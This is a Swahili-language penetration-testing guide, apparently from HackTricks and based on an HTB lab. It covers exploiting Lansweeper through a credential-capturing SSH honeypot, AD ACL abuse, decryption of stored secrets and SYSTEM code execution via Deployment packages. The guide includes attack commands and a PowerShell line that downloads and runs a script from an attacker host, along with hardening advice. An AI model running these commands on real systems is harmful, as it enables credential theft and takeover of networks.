# Unyonyaji wa Lansweeper: Uvunaji wa Credentials, Usimbuaji wa Siri, na RCE kupitia Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ni jukwaa la kugundua na kuorodhesha assets za IT, ambalo kwa kawaida huwekwa kwenye Windows na kuunganishwa na Active Directory. Credentials zilizosanidiwa katika Lansweeper hutumiwa na scanning engines zake ku-authenticate kwenye assets kupitia protocols kama SSH, SMB/WMI na WinRM. Misconfiguration mara nyingi huruhusu:

- Credential interception kwa kuelekeza scanning target kwenye host inayodhibitiwa na attacker (honeypot)
- Unyonyaji wa AD ACLs zinazoonekana kupitia groups zinazohusiana na Lansweeper ili kupata remote access
- On-host decryption ya secrets zilizosanidiwa katika Lansweeper (connection strings na scanning credentials zilizohifadhiwa)
- Code execution kwenye managed endpoints kupitia kipengele cha Deployment (mara nyingi kikiendeshwa kama SYSTEM)

Ukurasa huu unatoa muhtasari wa attacker workflows na commands za kutumia vibaya tabia hizi wakati wa engagements.

## 1) Vuna scanning credentials kupitia honeypot (mfano wa SSH)

Wazo: tengeneza Scanning Target inayoelekeza kwenye host yako na uipangie Scanning Credentials zilizopo. Scan itakapoendeshwa, Lansweeper itajaribu ku-authenticate kwa kutumia credentials hizo, na honeypot yako itazinasa.<sup>[[1]](#references)</sup>

Muhtasari wa hatua (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (au Single IP) = VPN IP yako
- Sanidi SSH port iwe inayoweza kufikiwa (kwa mfano, 2022 ikiwa 22 imezuiwa)
- Zima schedule na upange ku-trigger manually
- Scanning → Scanning Credentials → hakikisha Linux/SSH creds zipo; zipangie target mpya (wezesha zote inapohitajika)
- Bonyeza “Scan now” kwenye target
- Endesha SSH honeypot na upate username/password iliyojaribiwa

Mfano wa kutumia sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Thibitisha captured creds dhidi ya huduma za DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Hufanya kazi kwa njia sawa na protocols nyingine unapoweza kulazimisha scanner iwasiliane na listener yako (SMB/WinRM honeypots, n.k.). SSH mara nyingi ndiyo njia rahisi zaidi.
- Scanners wengi hujitambulisha kwa client banners maalum (k.m., RebexSSH) na watajaribu commands zisizo na madhara (uname, whoami, n.k.).

## 2) Matumizi mabaya ya AD ACL: pata remote access kwa kujiongeza kwenye app-admin group

Tumia BloodHound kuorodhesha effective rights kutoka kwenye akaunti iliyoathirika. Ugunduzi wa kawaida ni group maalum ya scanner au app (k.m., “Lansweeper Discovery”) yenye GenericAll juu ya group yenye privileged access (k.m., “Lansweeper Admins”). Ikiwa privileged group hiyo pia ni member wa “Remote Management Users”, WinRM itapatikana mara tu tunapojiongeza wenyewe.<sup>[[1]](#references)[[5]](#references)</sup>

Mifano ya Collection:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll kwenye group kwa kutumia BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kisha pata shell shirikishi:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kidokezo: Operesheni za Kerberos zinategemea muda. Ukipata KRB_AP_ERR_SKEW, sawazisha na DC kwanza:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt secrets zilizosanidiwa na Lansweeper kwenye host

Kwenye server ya Lansweeper, ASP.NET site kwa kawaida huhifadhi connection string iliyosimbwa na symmetric key inayotumiwa na application. Ukiwa na local access inayofaa, unaweza kudDecrypt DB connection string na kisha kutoa scanning credentials zilizohifadhiwa.<sup>[[1]](#references)</sup>

Maeneo ya kawaida:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Tumia SharpLansweeperDecrypt ku-automate decryption na dumping ya creds zilizohifadhiwa:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Matokeo yanayotarajiwa yanajumuisha maelezo ya muunganisho wa DB na scanning credentials za plaintext, kama vile akaunti za Windows na Linux zinazotumika katika mazingira yote. Mara nyingi akaunti hizi huwa na local rights zilizoinuliwa kwenye domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Tumia creds za Windows za scanning zilizopatikana kwa privileged access:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kama mwanachama wa “Lansweeper Admins”, web UI inaonyesha sehemu za Deployment na Configuration. Chini ya Deployment → Deployment packages, unaweza kuunda packages zinazoendesha commands za kiholela kwenye assets zilizolengwa. Utekelezaji unafanywa na Lansweeper service yenye privilege ya juu, hivyo kupata code execution kama NT AUTHORITY\SYSTEM kwenye host iliyochaguliwa.<sup>[[1]](#references)</sup>

Hatua za kiwango cha juu:
- Unda Deployment package mpya inayoendesha one-liner ya PowerShell au cmd (reverse shell, add-user, n.k.).
- Lenga asset unayotaka (kwa mfano, DC/host ambako Lansweeper inaendesha) na ubofye Deploy/Run now.
- Pokea shell yako kama SYSTEM.

Mifano ya payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions ni noisy na huacha logs katika Lansweeper na Windows event logs. Tumia kwa uangalifu.

## Detection na hardening

- Zuia au ondoa anonymous SMB enumerations. Fuatilia RID cycling na access isiyo ya kawaida kwenye Lansweeper shares.
- Egress controls: zuia au punguza kwa ukali outbound SSH/SMB/WinRM kutoka scanner hosts. Toa alert kuhusu ports zisizo za kawaida (k.m., 2022) na client banners zisizo za kawaida kama Rebex.
- Linda `Website\\web.config` na `Key\\Encryption.txt`. Hamishia secrets kwenye vault na uzibadilishe zinapofichuka. Zingatia service accounts zenye privileges chache na gMSA pale inapowezekana.
- AD monitoring: toa alert kuhusu mabadiliko kwenye groups zinazohusiana na Lansweeper (k.m., “Lansweeper Admins”, “Remote Management Users”) na kuhusu mabadiliko ya ACL yanayotoa GenericAll/Write membership kwenye privileged groups.
- Fanya audit ya Deployment package creations/changes/executions; toa alert kuhusu packages zinazoanzisha cmd.exe/powershell.exe au outbound connections zisizotarajiwa.

## Related topics
- SMB/LSA/SAMR enumeration na RID cycling
- Kerberos password spraying na considerations za clock skew
- BloodHound path analysis ya application-admin groups
- WinRM usage na lateral movement

## References
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
